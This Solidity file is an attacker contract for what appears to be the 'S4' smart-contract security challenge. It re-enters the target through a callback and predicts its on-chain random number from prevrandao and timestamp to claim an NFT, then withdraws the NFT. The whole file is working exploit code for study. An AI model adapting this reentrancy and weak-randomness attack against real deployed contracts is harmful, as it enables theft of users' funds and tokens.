// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// @notice Minimal interface for the S4 challenge contract.
interface IS4 {
    function solveChallenge(uint256 guess, string calldata yourTwitterHandle) external;
}

/// @notice Minimal ERC721 interface (only what we need for withdrawing).
interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract S4Attacker is IERC721Receiver {
    error NotOwner();

    address public immutable controller;

    address private s4;
    string private twitterHandle;

    constructor() {
        controller = msg.sender;
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function attack(address s4Address, string calldata yourTwitterHandle) external {
        s4 = s4Address;
        twitterHandle = yourTwitterHandle;

        // The first guess is irrelevant because S4 only checks it on the reentrant call.
        IS4(s4Address).solveChallenge(0, yourTwitterHandle);
    }

    /// @notice Called by S4 via low-level call. Reenters S4 with the correct RNG.
    function go() external {
        address target = s4;
        if (target == address(0)) {
            // Fallback: if someone calls go() directly, try to treat caller as S4.
            target = msg.sender;
        }

        // Must match S4's RNG derivation:
        // uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp))) % 1_000_000
        // In S4, msg.sender == address(this) (the attacker contract).
        uint256 rng = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;

        IS4(target).solveChallenge(rng, twitterHandle);
    }

    /// @notice Withdraw the minted NFT from this contract to my EOA.
    /// @dev Use the ERC721 contract address and the tokenId.
    function withdrawNft(address nft, uint256 tokenId, address to) external {
        if (msg.sender != controller) revert NotOwner();
        IERC721(nft).safeTransferFrom(address(this), to, tokenId);
    }

    /// @notice Allows this contract to receive ERC721s via safeMint/safeTransfer.
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
